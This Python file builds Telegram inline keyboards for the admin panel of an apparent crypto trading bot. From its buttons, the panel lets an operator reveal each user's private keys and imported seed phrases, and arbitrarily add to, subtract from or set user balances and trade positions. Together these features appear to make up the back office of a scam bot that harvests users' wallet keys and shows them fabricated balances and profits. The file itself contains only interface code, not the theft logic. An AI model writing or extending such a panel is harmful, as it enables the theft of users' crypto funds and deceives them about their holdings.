from __future__ import annotations

from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup


def admin_main_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="👥 Users", callback_data="admin:users:1"),
                InlineKeyboardButton(text="💰 Balances", callback_data="admin:balances:1"),
            ],
            [
                InlineKeyboardButton(text="🔐 Wallets", callback_data="admin:wallets"),
                InlineKeyboardButton(text="📊 Statistics", callback_data="admin:statistics"),
            ],
            [
                InlineKeyboardButton(text="📋 Logs", callback_data="admin:logs"),
                InlineKeyboardButton(text="⚙️ Settings", callback_data="admin:settings"),
            ],
        ]
    )


def admin_back_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Back", callback_data="admin:home")]
        ]
    )


def back_to_users_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Back to Users", callback_data="admin:users:1")]
        ]
    )


def registered_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✏️ Edit Positions", callback_data=f"admin:trades:{user_id}")],
            [InlineKeyboardButton(text="🔢 Edit Position Count", callback_data=f"admin:position_count:{user_id}")],
            [InlineKeyboardButton(text="✏️ Edit SOL", callback_data=f"admin:balance_asset:{user_id}:SOL")],
            [InlineKeyboardButton(text="✏️ Edit BNB", callback_data=f"admin:balance_asset:{user_id}:BNB")],
            [InlineKeyboardButton(text="✏️ Edit ETH", callback_data=f"admin:balance_asset:{user_id}:ETH")],
            [InlineKeyboardButton(text="🔑 Reveal SOL Key", callback_data=f"admin:user_wallet_key:{user_id}:solana")],
            [InlineKeyboardButton(text="🔑 Reveal ETH Key", callback_data=f"admin:user_wallet_key:{user_id}:ethereum")],
            [InlineKeyboardButton(text="🔑 Reveal BNB Key", callback_data=f"admin:user_wallet_key:{user_id}:bnb")],
            [InlineKeyboardButton(text="🔐 Reveal Imported Key/Phrase", callback_data=f"admin:imported_pk:{user_id}")],
            [InlineKeyboardButton(text="⬅️ Back to Users", callback_data="admin:users:1")],
        ]
    )


def positions_keyboard(trades, user_id: int) -> InlineKeyboardMarkup:
    rows = []
    for trade in trades:
        token_ca = trade.asset_out if trade.side == "buy" else trade.asset_in
        label = f"{trade.side.title()} {token_ca[:12]}…"
        rows.append(
            [InlineKeyboardButton(text=label, callback_data=f"admin:position:{trade.id}")]
        )
    rows.extend(
        [
            [InlineKeyboardButton(text="⬅️ Back", callback_data=f"admin:user:{user_id}")],
            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="admin:home")],
        ]
    )
    return InlineKeyboardMarkup(inline_keyboard=rows)


def position_edit_keyboard(trade_id: int, user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="+10%", callback_data=f"admin:position_pct:{trade_id}:10"),
                InlineKeyboardButton(text="+30%", callback_data=f"admin:position_pct:{trade_id}:30"),
                InlineKeyboardButton(text="+50%", callback_data=f"admin:position_pct:{trade_id}:50"),
            ],
            [
                InlineKeyboardButton(text="-10%", callback_data=f"admin:position_pct:{trade_id}:-10"),
                InlineKeyboardButton(text="-30%", callback_data=f"admin:position_pct:{trade_id}:-30"),
                InlineKeyboardButton(text="-50%", callback_data=f"admin:position_pct:{trade_id}:-50"),
            ],
            [InlineKeyboardButton(text="✏️ Custom %", callback_data=f"admin:position_custom:{trade_id}")],
            [InlineKeyboardButton(text="⬅️ Positions", callback_data=f"admin:trades:{user_id}")],
            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="admin:home")],
        ]
    )


def wallets_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="🔑 SOL Private Key", callback_data="admin:reveal:solana"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔑 ETH Private Key", callback_data="admin:reveal:ethereum"
                )
            ],
            [
                InlineKeyboardButton(
                    text="🔑 BNB Private Key", callback_data="admin:reveal:bnb"
                )
            ],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="admin:home")],
        ]
    )


def reveal_confirmation_keyboard(chain: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Reveal", callback_data=f"admin:reveal_confirm:{chain}"
                ),
                InlineKeyboardButton(text="Cancel", callback_data="admin:wallets"),
            ]
        ]
    )


def users_keyboard(users, page: int, total: int, page_size: int) -> InlineKeyboardMarkup:
    rows = []
    for user in users:
        full_name = " ".join(
            part for part in (user.first_name, user.last_name) if part
        )
        label = f"@{user.username}" if user.username else full_name
        if not label:
            label = f"User {user.telegram_id}"
        rows.append(
            [InlineKeyboardButton(text=label, callback_data=f"admin:user:{user.id}")]
        )
    navigation = []
    if page > 1:
        navigation.append(
            InlineKeyboardButton(text="◀️", callback_data=f"admin:users:{page - 1}")
        )
    if page * page_size < total:
        navigation.append(
            InlineKeyboardButton(text="▶️", callback_data=f"admin:users:{page + 1}")
        )
    if navigation:
        rows.append(navigation)
    rows.append([InlineKeyboardButton(text="⬅️ Back", callback_data="admin:home")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def user_detail_keyboard(user_id: int, is_active: bool) -> InlineKeyboardMarkup:
    return registered_user_keyboard(user_id)


def balance_asset_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="👤 Edit SOL", callback_data=f"admin:balance_asset:{user_id}:SOL"
                )
            ],
            [
                InlineKeyboardButton(
                    text="👤 Edit ETH", callback_data=f"admin:balance_asset:{user_id}:ETH"
                )
            ],
            [
                InlineKeyboardButton(
                    text="👤 Edit BNB", callback_data=f"admin:balance_asset:{user_id}:BNB"
                )
            ],
            [InlineKeyboardButton(text="⬅️ Back", callback_data=f"admin:user:{user_id}")],
        ]
    )


def balance_action_keyboard(user_id: int, asset: str) -> InlineKeyboardMarkup:
    prefix = f"admin:balance_action:{user_id}:{asset}"
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="➕ Add", callback_data=f"{prefix}:add"),
                InlineKeyboardButton(text="➖ Subtract", callback_data=f"{prefix}:subtract"),
            ],
            [
                InlineKeyboardButton(text="✏️ Set Balance", callback_data=f"{prefix}:set")
            ],
            [
                InlineKeyboardButton(
                    text="⬅️ Back", callback_data=f"admin:balance:{user_id}"
                )
            ],
        ]
    )


def balance_confirmation_keyboard(user_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Confirm", callback_data="admin:balance_confirm"
                ),
                InlineKeyboardButton(
                    text="Cancel", callback_data=f"admin:user:{user_id}"
                ),
            ]
        ]
    )
